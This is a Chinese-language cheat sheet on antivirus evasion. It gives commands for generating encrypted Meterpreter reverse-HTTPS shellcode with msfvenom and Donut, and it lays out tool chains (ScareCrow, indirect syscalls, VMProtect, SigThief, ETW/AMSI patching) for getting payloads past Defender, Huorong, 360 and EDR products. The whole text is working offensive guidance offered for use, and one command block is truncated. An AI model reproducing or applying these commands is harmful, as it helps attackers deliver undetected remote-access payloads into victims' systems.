# 02 - 免杀工具篇

## 一、Shellcode生成工具

### 1. Donut（推荐首选）
将EXE/DLL/VBS/JS/.NET转为Position-Independent shellcode
```bash
# 生成shellcode
donut -i payload.exe -o payload.bin -a 2 -b 1 -e 1 -k 2

# 生成特定格式
donut -i payload.exe -f csharp -o payload.cs    # C#格式
donut -i payload.exe -f python -o payload.py    # Python格式
donut -i payload.exe -f powershell -o payload.ps1

# Python模块使用
pip install donut-shellcode
python -c "import donut; donut.create(file='payload.exe')"
```

### 2. msfvenom（Metasploit内置）
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 \
  --encrypt aes256 --encrypt-key 'Key!2025' -f raw -o payload.bin
```

### 3. CobaltStrike Artifact Kit
自定义生成shellcode和loader，支持自定义syscall stub

### 4. Sliver
开源C2框架，默认payload免杀效果好于msfvenom

## 七、工具组合推荐方案

### 方案A：新手快速上手（5分钟内）
```bash

  --encrypt aes256 --encrypt-key 'Key2025!' -f raw -o payload.bin
./ScareCrow -I payload.bin -domain www.microsoft.com
```

### 方案B：中等对抗（过Defender/火绒）
```bash
# 1. 生成加密shellcode
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 \
  --encrypt rc4 --encrypt-key 'Key2025!' -f csharp -o payload.cs
# 2. 放入C# syscall loader
# 3. 使用D/Invoke + 间接syscall
```

### 方案C：高级对抗（过360/EDR）
```
1. Shellcode生成 → Donut + 多态key
2. Go/C编译 → garble + 间接syscall + APCs
3. PE处理 → VMProtect + SigThief
4. 运行时 → ETW/AMSI patching + 环境检测
```
